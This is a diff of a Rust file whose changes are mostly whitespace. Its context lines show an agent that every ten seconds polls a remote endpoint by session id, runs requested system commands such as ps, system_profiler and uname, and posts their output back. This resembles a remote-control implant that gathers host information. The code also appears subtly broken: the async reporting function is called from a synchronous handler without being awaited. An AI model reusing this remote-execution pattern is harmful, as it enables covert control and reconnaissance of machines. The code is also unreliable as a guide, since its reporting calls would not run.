@@ -1,3 +1,5 @@
+// src/comm/monitor.rs
+
 use serde::{Deserialize, Serialize};
 use serde_json::{from_str, json, to_string};
 
@@ -102,24 +104,24 @@ async fn request_json(_sessionid: &str, _since: u64) -> Result<String, Box<dyn s
  async fn response_json(_sessionid: &str, _response: String) -> Result<String, Box<dyn std::error::Error>> {
      /* Set URL (for remote API). */
      let url = format!("{}{}", L1_ENDPOINT, "session");
- 
+
      let exec_response = ExecResponse {
          sessionid: _sessionid.to_string(),
          method: "res".to_string(),
          resp: _response,
      };
- 
+
      let json_string = to_string(&exec_response).unwrap();
- 
+
      let client = reqwest::Client::new();
      let response = client.post(url)
          .header("Content-Type", "application/json")
          .body(json_string.to_string())
          .send()
          .await?;
- 
+
      let response_body = response.text().await?;
- 
+
      /* Return response. */
      Ok(response_body)
  }
@@ -210,19 +212,19 @@ fn _handle_exec(_sessionid: &str, _resp: Vec<Request>) {
             response_json(_sessionid, response);
             return ();
         }
-    
+
         if (exec == "ps") {
             let response = cmd::sys::ps().expect("Oops! Could NOT execute `ps`.");
             response_json(_sessionid, response);
             return ();
         }
-    
+
         if (exec == "profiler") {
             let response = cmd::sys::system_profiler().expect("Oops! Could NOT execute `system_profiler`.");
             response_json(_sessionid, response);
             return ();
         }
-    
+
         if (exec == "uname") {
             let response = cmd::sys::get_uname().expect("Oops! Could NOT execute `uname`.");
             response_json(_sessionid, response);
@@ -234,7 +236,7 @@ fn _handle_exec(_sessionid: &str, _resp: Vec<Request>) {
             response_json(_sessionid, response);
             return ();
         }
-    
+
         /*************************************/
         /* HELP */
         /*************************************/
@@ -297,9 +299,9 @@ pub fn by_session(_sessionid: &str) {
     loop {
         let ten_seconds = time::Duration::from_millis(10000);
         let now = time::Instant::now();
-        
+
         thread::sleep(ten_seconds);
-        
+
         assert!(now.elapsed() >= ten_seconds);
 
         unsafe {
